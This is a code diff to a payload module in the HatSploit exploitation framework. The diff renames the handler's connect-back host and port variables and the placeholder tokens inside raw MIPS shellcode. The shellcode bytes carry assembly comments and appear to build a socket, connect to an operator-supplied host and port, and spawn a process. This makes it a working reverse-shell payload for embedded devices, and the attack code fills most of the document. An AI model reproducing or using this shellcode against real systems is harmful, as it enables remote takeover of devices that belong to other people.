@@ -26,8 +26,8 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        connback_host = self.handler['CBHOST']
-        connback_port = self.handler['CBPORT']
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
         return (
             b"\xff\xff\x04\x28"  # slti    a0,zero,-1
@@ -51,11 +51,11 @@ class HatSploitPayload(Payload):
             b"\x0c\x09\x09\x01"  # syscall 0x42424
             b"\xc9\x0f\x02\x24"  # li      v0,4041
             b"\x0c\x09\x09\x01"  # syscall 0x42424
-            b":cbport:port:\x05\x3c"  # "\x7a\x69" lui     a1,0x697a
+            b":rport:port:\x05\x3c"  # "\x7a\x69" lui     a1,0x697a
             b"\x02\x00\xa5\x34"  # ori     a1,a1,0x2
             b"\xf8\xff\xa5\xaf"  # sw      a1,-8(sp)
-            b":cbhost1:\x05\x3c"  # "\x00\x01" lui     a1,0x100
-            b":cbhost2:\xa5\x34"  # "\x7f\x00" ori     a1,a1,0x7f
+            b":rhost1:\x05\x3c"  # "\x00\x01" lui     a1,0x100
+            b":rhost2:\xa5\x34"  # "\x7f\x00" ori     a1,a1,0x7f
             b"\xfc\xff\xa5\xaf"  # sw      a1,-4(sp)
             b"\xf8\xff\xa5\x23"  # addi    a1,sp,-8
             b"\xef\xff\x0c\x24"  # li      t4,-17
@@ -80,7 +80,7 @@ class HatSploitPayload(Payload):
             b"\xab\x0f\x02\x24"  # li      v0,4011
             b"\x0c\x09\x09\x01"  # syscall 0x42424
         ), {
-            'cbport': connback_port,
-            'cbhost1': socket.inet_aton(connback_host)[2:],
-            'cbhost2': socket.inet_aton(connback_host)[:2]
+            'rport': remote_port,
+            'rhost1': socket.inet_aton(remote_host)[2:],
+            'rhost2': socket.inet_aton(remote_host)[:2]
         }
